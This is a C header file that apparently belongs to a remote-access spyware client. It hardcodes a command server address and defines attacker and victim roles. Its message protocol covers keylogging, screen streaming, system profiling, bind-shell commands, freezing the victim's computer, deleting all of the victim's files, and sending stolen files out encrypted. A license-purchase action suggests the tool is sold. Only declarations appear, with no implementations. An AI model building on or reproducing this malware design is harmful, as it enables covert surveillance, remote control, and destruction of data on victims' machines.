#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdbool.h>
#include "md5.h"


#define PORT 50008
//#define SERVER_IP "127.0.0.1"
#define SERVER_IP "20.20.20.115"

#define RSA_BASE64_AES_KEY_SIZE 500
#define MTU 1024 // maximum transformation unit
#define HASH_LEN 34
#define MAX_KEYSTROKE_LEN 20
#define LICENES_KEY_LENGTH 20
#define MAX_BIND_SHELL_COMMAND 500
#define MAX_FILE_TO_BUFFER_COMMEND_LEN 150

#define TEMP_RCVE_AES_KEY_FILE_NAME ".temp_aes_key.txt"
#define ENCRYPTED_RECEIVED_DATA_NAME ".temp_enc_file"
#define ENCRYPTED_TEXT_LEN(len) (int) ((len * 1.36) + 100)
#define AES_KEY_LEN 16

#define MAX_PASSWORD_LEN 16
#define MAX_USER_NAME_LEN 32
#define MAX_KEYSTROKE_LEN 20
#define LICENSE_KEY_LENGTH 20

int V_S_socket; // global value
char AES_KEY[AES_KEY_LEN + 1];

typedef enum {
	SUCCESS,
	FAILUR
} STATUS;

typedef enum {
	ATTACKER,
	VICTIM
} sender;

typedef enum {
	LOG_IN,
	REGISTER,
	BUY_LICENSE_KEY,
	SELECT_VICTIM,
	GET_CONNECTED_VICTM,
	GET_KEYLOGGER_HISTORY, 
	GET_KEYSTROKES_STREAM,
	STOP_KEYSTROKES_STREAM,
	GET_SCREEN_STREAM,
	STOP_SCREEN_STREAM,
	GET_SYSTEM_PROFILER,
	SEND_BIND_SHELL_COMMAND,
	STUCK_VICTIMS_COMPUTER,
	DELETE_VICTIMS_ALL_FILES,
	GET_VICTIM_PAYLOAD,
	KEY_EXCHANGE,
} action_type;

typedef struct {
	char victim_name[ENCRYPTED_TEXT_LEN(MAX_USER_NAME_LEN)];
	char id[HASH_LEN];
} encrypted_log_in_vicitm_protocol;

typedef struct {
	char file_sub_buffer[MTU]; // Will contain sub-buffer of the file converted to bade 64 with aes 256 CBC encryption
	int end_of_file; // Will contain 0 unless the function reached the end of the file
	char checksum[HASH_LEN]; // 'checksum' will contain 0s, when the function reached the end of the file 'checksum' will contain the checksum of the file.
} encrypted_file_transformation_protocol; // In this convention, the receiver will know when the end of the file arrived and if all the file arrive successfully

typedef union{
	char keylogger_stream_key[MAX_KEYSTROKE_LEN];
	char bind_shell_command[MAX_BIND_SHELL_COMMAND];
	char selected_victim_name[MAX_USER_NAME_LEN];
	encrypted_file_transformation_protocol file_data;
} main_data;

typedef union{
	encrypted_log_in_vicitm_protocol encrypted_login_vicim_to_Ospy;
	char keylogger_stream_key[ENCRYPTED_TEXT_LEN(MAX_KEYSTROKE_LEN)];
	char bind_shell_command[ENCRYPTED_TEXT_LEN(MAX_BIND_SHELL_COMMAND)];
	char selected_victim_name[ENCRYPTED_TEXT_LEN(MAX_USER_NAME_LEN)];
	encrypted_file_transformation_protocol file_data;
	char key_exchange_buffer[RSA_BASE64_AES_KEY_SIZE];
} encrypted_main_data;

typedef struct {
	action_type action;
	main_data data;
} general_message_protocol;

typedef struct {
	sender i_am;
	action_type action;
	encrypted_main_data data;
} encrypted_general_message_protocol;

void key_exchange (int V_S_socket);
STATUS create_connection();

void log_in_victim();
void V_2_S_encrypted_message_handler(main_data data, action_type action);
void send_file(char * file_name, action_type action, bool base64);
void send_keystrock(char * key);
char * encrypt_text (char * text_to_encrypt, char * encrypt_key);
char * decrypt_text (char * text_to_decrypt, char * decryption_key);
void secure_key_exchange();